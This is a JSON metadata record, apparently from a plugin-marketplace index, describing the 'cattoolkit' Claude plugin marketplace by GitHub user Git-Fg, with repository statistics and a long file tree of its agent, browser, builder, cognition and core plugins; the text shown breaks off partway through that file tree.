{
  "author": {
    "id": "Git-Fg",
    "display_name": "Git-Fg",
    "type": "User",
    "avatar_url": "https://avatars.githubusercontent.com/u/7906045?v=4",
    "url": "https://github.com/Git-Fg",
    "bio": null,
    "stats": {
      "total_marketplaces": 1,
      "total_plugins": 9,
      "total_commands": 12,
      "total_skills": 35,
      "total_stars": 1,
      "total_forks": 0
    }
  },
  "marketplaces": [
    {
      "name": "cattoolkit",
      "version": null,
      "description": "Official plugin marketplace for The Cat Toolkit - A layered orchestration framework for autonomous AI development with vibecoding principles.",
      "owner_info": {
        "name": "Git-Fg"
      },
      "keywords": [],
      "repo_full_name": "Git-Fg/thecattoolkit",
      "repo_url": "https://github.com/Git-Fg/thecattoolkit",
      "repo_description": null,
      "homepage": null,
      "signals": {
        "stars": 1,
        "forks": 0,
        "pushed_at": "2026-01-15T14:10:14Z",
        "created_at": "2026-01-08T23:42:51Z",
        "license": "MIT"
      },
      "file_tree": [
        {
          "path": ".claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": ".claude-plugin/marketplace.json",
          "type": "blob",
          "size": 7626
        },
        {
          "path": "plugins",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 310
        },
        {
          "path": "plugins/sys-agents/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/SKILL.md",
          "type": "blob",
          "size": 5855
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/references/action-hierarchy.md",
          "type": "blob",
          "size": 3304
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/references/computer-access.md",
          "type": "blob",
          "size": 2836
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/references/context-patterns.md",
          "type": "blob",
          "size": 4305
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/references/progressive-disclosure.md",
          "type": "blob",
          "size": 2304
        },
        {
          "path": "plugins/sys-agents/skills/architecting-agents/references/subagent-risks.md",
          "type": "blob",
          "size": 2230
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/SKILL.md",
          "type": "blob",
          "size": 1417
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/architectures.md",
          "type": "blob",
          "size": 17557
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/crewai-approach.md",
          "type": "blob",
          "size": 23465
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/custom-pipeline.md",
          "type": "blob",
          "size": 17797
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/decision-matrix.md",
          "type": "blob",
          "size": 1020
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/elasticsearch-hybrid.md",
          "type": "blob",
          "size": 14205
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/graph-rag.md",
          "type": "blob",
          "size": 14766
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/patterns.md",
          "type": "blob",
          "size": 21100
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/postgresql-hybrid.md",
          "type": "blob",
          "size": 10480
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/tech-stack.md",
          "type": "blob",
          "size": 13825
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/temporal-kg.md",
          "type": "blob",
          "size": 17973
        },
        {
          "path": "plugins/sys-agents/skills/architecting-memory/references/vector-rag.md",
          "type": "blob",
          "size": 8558
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context/SKILL.md",
          "type": "blob",
          "size": 6126
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context/references/compression.md",
          "type": "blob",
          "size": 2608
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context/references/degradation.md",
          "type": "blob",
          "size": 3451
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context/references/kv-cache.md",
          "type": "blob",
          "size": 3005
        },
        {
          "path": "plugins/sys-agents/skills/optimizing-context/references/session-management.md",
          "type": "blob",
          "size": 2880
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/SKILL.md",
          "type": "blob",
          "size": 6900
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references/context-isolation.md",
          "type": "blob",
          "size": 15602
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references/coordination.md",
          "type": "blob",
          "size": 15663
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references/hierarchical-pattern.md",
          "type": "blob",
          "size": 13250
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references/implementation-guide.md",
          "type": "blob",
          "size": 16321
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references/orchestrator-pattern.md",
          "type": "blob",
          "size": 10447
        },
        {
          "path": "plugins/sys-agents/skills/orchestrating-agents/references/swarm-pattern.md",
          "type": "blob",
          "size": 13123
        },
        {
          "path": "plugins/sys-browser",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 568
        },
        {
          "path": "plugins/sys-browser/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/commands/browse.md",
          "type": "blob",
          "size": 265
        },
        {
          "path": "plugins/sys-browser/commands/crawl.md",
          "type": "blob",
          "size": 267
        },
        {
          "path": "plugins/sys-browser/commands/read.md",
          "type": "blob",
          "size": 220
        },
        {
          "path": "plugins/sys-browser/commands/save.md",
          "type": "blob",
          "size": 271
        },
        {
          "path": "plugins/sys-browser/commands/spider.md",
          "type": "blob",
          "size": 261
        },
        {
          "path": "plugins/sys-browser/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/skills/browsing-web",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/skills/browsing-web/SKILL.md",
          "type": "blob",
          "size": 1314
        },
        {
          "path": "plugins/sys-browser/skills/crawling-content",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/skills/crawling-content/SKILL.md",
          "type": "blob",
          "size": 658
        },
        {
          "path": "plugins/sys-browser/skills/testing-e2e",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-browser/skills/testing-e2e/SKILL.md",
          "type": "blob",
          "size": 1564
        },
        {
          "path": "plugins/sys-builder",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 493
        },
        {
          "path": "plugins/sys-builder/README.md",
          "type": "blob",
          "size": 1325
        },
        {
          "path": "plugins/sys-builder/agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/agents/executor.md",
          "type": "blob",
          "size": 312
        },
        {
          "path": "plugins/sys-builder/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/commands/code-review.md",
          "type": "blob",
          "size": 391
        },
        {
          "path": "plugins/sys-builder/commands/manage-plan.md",
          "type": "blob",
          "size": 260
        },
        {
          "path": "plugins/sys-builder/commands/plan.md",
          "type": "blob",
          "size": 316
        },
        {
          "path": "plugins/sys-builder/commands/run-plan.md",
          "type": "blob",
          "size": 267
        },
        {
          "path": "plugins/sys-builder/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard/SKILL.md",
          "type": "blob",
          "size": 2931
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard/references/auth-gates.md",
          "type": "blob",
          "size": 5979
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard/references/execution-protocol.md",
          "type": "blob",
          "size": 3642
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard/references/handoff-protocol.md",
          "type": "blob",
          "size": 5007
        },
        {
          "path": "plugins/sys-builder/skills/adhering-execution-standard/references/observation-points.md",
          "type": "blob",
          "size": 8100
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/SKILL.md",
          "type": "blob",
          "size": 1536
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/core-engineering.md",
          "type": "blob",
          "size": 8328
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/debug.md",
          "type": "blob",
          "size": 2094
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/prototype.md",
          "type": "blob",
          "size": 3662
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/refactor.md",
          "type": "blob",
          "size": 899
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/refactoring-patterns.md",
          "type": "blob",
          "size": 1962
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/review-workflow.md",
          "type": "blob",
          "size": 5089
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/security-audit.md",
          "type": "blob",
          "size": 719
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/security-checklist.md",
          "type": "blob",
          "size": 3837
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/static-analysis-workflow.md",
          "type": "blob",
          "size": 6263
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/tdd-protocol.md",
          "type": "blob",
          "size": 4572
        },
        {
          "path": "plugins/sys-builder/skills/applying-code-standards/references/test-driven-development.md",
          "type": "blob",
          "size": 6258
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/SKILL.md",
          "type": "blob",
          "size": 2865
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references/adr-template.md",
          "type": "blob",
          "size": 882
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references/architecture-patterns.md",
          "type": "blob",
          "size": 692
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references/codebase-discovery.md",
          "type": "blob",
          "size": 577
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references/discovery.md",
          "type": "blob",
          "size": 2557
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references/quality-checklist.md",
          "type": "blob",
          "size": 5618
        },
        {
          "path": "plugins/sys-builder/skills/designing-architecture/references/system-design.md",
          "type": "blob",
          "size": 3688
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/SKILL.md",
          "type": "blob",
          "size": 3927
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/references/conventions.md",
          "type": "blob",
          "size": 1690
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/references/dom-testing.md",
          "type": "blob",
          "size": 1632
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/references/examples.md",
          "type": "blob",
          "size": 2323
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/references/methodology.md",
          "type": "blob",
          "size": 2086
        },
        {
          "path": "plugins/sys-builder/skills/generating-tests/references/patterns.md",
          "type": "blob",
          "size": 1111
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/SKILL.md",
          "type": "blob",
          "size": 3697
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/assets",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/assets/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/assets/templates/brief.md",
          "type": "blob",
          "size": 1901
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/assets/templates/handoff.md",
          "type": "blob",
          "size": 935
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/assets/templates/roadmap.md",
          "type": "blob",
          "size": 1837
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references/creation-workflow.md",
          "type": "blob",
          "size": 5619
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references/execution-workflow.md",
          "type": "blob",
          "size": 3448
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references/handoff-protocols.md",
          "type": "blob",
          "size": 13272
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references/modification-workflow.md",
          "type": "blob",
          "size": 4205
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references/state-management.md",
          "type": "blob",
          "size": 9655
        },
        {
          "path": "plugins/sys-builder/skills/managing-plans/references/verification-workflows.md",
          "type": "blob",
          "size": 11891
        },
        {
          "path": "plugins/sys-builder/skills/managing-python",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/managing-python/SKILL.md",
          "type": "blob",
          "size": 4531
        },
        {
          "path": "plugins/sys-builder/skills/managing-python/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-builder/skills/managing-python/references/migration.md",
          "type": "blob",
          "size": 4838
        },
        {
          "path": "plugins/sys-builder/skills/managing-python/references/ruff-guide.md",
          "type": "blob",
          "size": 5427
        },
        {
          "path": "plugins/sys-builder/skills/managing-python/references/uv-guide.md",
          "type": "blob",
          "size": 4668
        },
        {
          "path": "plugins/sys-builder/skills/managing-python/references/workflows.md",
          "type": "blob",
          "size": 6734
        },
        {
          "path": "plugins/sys-cognition",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 499
        },
        {
          "path": "plugins/sys-cognition/README.md",
          "type": "blob",
          "size": 1483
        },
        {
          "path": "plugins/sys-cognition/agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/agents/reasoner.md",
          "type": "blob",
          "size": 307
        },
        {
          "path": "plugins/sys-cognition/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/commands/think.md",
          "type": "blob",
          "size": 393
        },
        {
          "path": "plugins/sys-cognition/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning/SKILL.md",
          "type": "blob",
          "size": 1849
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning/references/framework-applications.md",
          "type": "blob",
          "size": 16127
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning/references/prioritization.md",
          "type": "blob",
          "size": 3015
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning/references/problem-analysis.md",
          "type": "blob",
          "size": 3316
        },
        {
          "path": "plugins/sys-cognition/skills/applying-reasoning/references/strategic.md",
          "type": "blob",
          "size": 3725
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/SKILL.md",
          "type": "blob",
          "size": 3219
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/agent-sub.md",
          "type": "blob",
          "size": 822
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain-summary.md",
          "type": "blob",
          "size": 639
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/execute.md",
          "type": "blob",
          "size": 1402
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/plan.md",
          "type": "blob",
          "size": 1349
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/refine.md",
          "type": "blob",
          "size": 1413
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/chain/research.md",
          "type": "blob",
          "size": 1272
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/command-complex.md",
          "type": "blob",
          "size": 6746
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/meta",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/meta/generator.md",
          "type": "blob",
          "size": 1711
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/meta/optimizer.md",
          "type": "blob",
          "size": 2057
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/single-prompt.md",
          "type": "blob",
          "size": 400
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/assets/templates/tool-prompt.md",
          "type": "blob",
          "size": 1177
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/anti-patterns.md",
          "type": "blob",
          "size": 8223
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/core-standards.md",
          "type": "blob",
          "size": 5236
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/design-patterns.md",
          "type": "blob",
          "size": 12310
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/discovery.md",
          "type": "blob",
          "size": 8747
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/draft-workflow.md",
          "type": "blob",
          "size": 2782
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/examples",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/examples/complex-command-db-optimization.md",
          "type": "blob",
          "size": 7438
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/examples/meta-prompt-generator.md",
          "type": "blob",
          "size": 4587
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/examples/research-workflow.md",
          "type": "blob",
          "size": 10278
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/examples/single-prompt-example.md",
          "type": "blob",
          "size": 2918
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/examples/sub-agent-explorer.md",
          "type": "blob",
          "size": 3457
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/execution-protocol.md",
          "type": "blob",
          "size": 3079
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/metadata.md",
          "type": "blob",
          "size": 1333
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/optimization-workflow.md",
          "type": "blob",
          "size": 2203
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/optimization.md",
          "type": "blob",
          "size": 2322
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/quality.md",
          "type": "blob",
          "size": 7004
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/research-prompts.md",
          "type": "blob",
          "size": 9845
        },
        {
          "path": "plugins/sys-cognition/skills/architecting-prompts/references/taxonomy.md",
          "type": "blob",
          "size": 2007
        },
        {
          "path": "plugins/sys-cognition/skills/facilitating-reasoning",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/facilitating-reasoning/SKILL.md",
          "type": "blob",
          "size": 1404
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/SKILL.md",
          "type": "blob",
          "size": 5152
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/do-patterns.md",
          "type": "blob",
          "size": 3140
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/execution-logic.md",
          "type": "blob",
          "size": 1027
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/metadata-guidelines.md",
          "type": "blob",
          "size": 1592
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/plan-patterns.md",
          "type": "blob",
          "size": 3338
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/question-bank.md",
          "type": "blob",
          "size": 1918
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/research-patterns.md",
          "type": "blob",
          "size": 2590
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/summary-template.md",
          "type": "blob",
          "size": 2389
        },
        {
          "path": "plugins/sys-cognition/skills/generating-prompts/references/usage-workflow.md",
          "type": "blob",
          "size": 1441
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude/SKILL.md",
          "type": "blob",
          "size": 1073
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude/references/advanced-features.md",
          "type": "blob",
          "size": 18970
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude/references/context-window.md",
          "type": "blob",
          "size": 12900
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude/references/fundamentals.md",
          "type": "blob",
          "size": 9719
        },
        {
          "path": "plugins/sys-cognition/skills/operating-claude/references/patterns.md",
          "type": "blob",
          "size": 13175
        },
        {
          "path": "plugins/sys-core",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 568
        },
        {
          "path": "plugins/sys-core/README.md",
          "type": "blob",
          "size": 2017
        },
        {
          "path": "plugins/sys-core/agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/agents/security-auditor.md",
          "type": "blob",
          "size": 281
        },
        {
          "path": "plugins/sys-core/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/commands/doctor.md",
          "type": "blob",
          "size": 459
        },
        {
          "path": "plugins/sys-core/hooks",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/hooks/hooks.json",
          "type": "blob",
          "size": 1098
        },
        {
          "path": "plugins/sys-core/hooks/scripts",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/hooks/scripts/context-monitor.py",
          "type": "blob",
          "size": 2429
        },
        {
          "path": "plugins/sys-core/hooks/scripts/inject_protocols.sh",
          "type": "blob",
          "size": 1789
        },
        {
          "path": "plugins/sys-core/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/SKILL.md",
          "type": "blob",
          "size": 1336
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/coordinator-agent.md",
          "type": "blob",
          "size": 2518
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/explorer-agent.md",
          "type": "blob",
          "size": 3378
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/progressive-disclosure.md",
          "type": "blob",
          "size": 2047
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/reference-file.md",
          "type": "blob",
          "size": 2740
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/router-pattern.md",
          "type": "blob",
          "size": 2043
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/standard-skill.md",
          "type": "blob",
          "size": 506
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/assets/templates/universal-agent.md",
          "type": "blob",
          "size": 695
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/examples",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/examples/bash-logic.md",
          "type": "blob",
          "size": 1787
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/examples/router-pattern.md",
          "type": "blob",
          "size": 3169
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/agent-security.md",
          "type": "blob",
          "size": 8340
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/background-execution.md",
          "type": "blob",
          "size": 2711
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/command-standards.md",
          "type": "blob",
          "size": 1108
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/component-guidelines.md",
          "type": "blob",
          "size": 5657
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/cross-platform.md",
          "type": "blob",
          "size": 7355
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/examples.md",
          "type": "blob",
          "size": 2264
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/full-spec.md",
          "type": "blob",
          "size": 3444
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/permissions-guide.md",
          "type": "blob",
          "size": 999
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/standards-communication.md",
          "type": "blob",
          "size": 1552
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/standards-security.md",
          "type": "blob",
          "size": 4775
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/syntax-guide.md",
          "type": "blob",
          "size": 2115
        },
        {
          "path": "plugins/sys-core/skills/adhering-standards/references/validation.md",
          "type": "blob",
          "size": 2556
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/SKILL.md",
          "type": "blob",
          "size": 4717
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/references/checklist.md",
          "type": "blob",
          "size": 6918
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/references/compliance.md",
          "type": "blob",
          "size": 368
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/references/marketplace-customization.md",
          "type": "blob",
          "size": 7478
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/references/patterns.md",
          "type": "blob",
          "size": 9774
        },
        {
          "path": "plugins/sys-core/skills/auditing-plugins/references/security.md",
          "type": "blob",
          "size": 515
        },
        {
          "path": "plugins/sys-core/skills/auditing-security",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/auditing-security/SKILL.md",
          "type": "blob",
          "size": 2508
        },
        {
          "path": "plugins/sys-core/skills/checking-types",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/checking-types/SKILL.md",
          "type": "blob",
          "size": 812
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp/SKILL.md",
          "type": "blob",
          "size": 2664
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp/references/mcp-configuration.md",
          "type": "blob",
          "size": 4167
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp/references/performance.md",
          "type": "blob",
          "size": 18054
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp/references/schema-management.md",
          "type": "blob",
          "size": 19790
        },
        {
          "path": "plugins/sys-core/skills/integrating-mcp/references/security.md",
          "type": "blob",
          "size": 17402
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/SKILL.md",
          "type": "blob",
          "size": 4653
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references",
          "type": "tree",
          "size": null
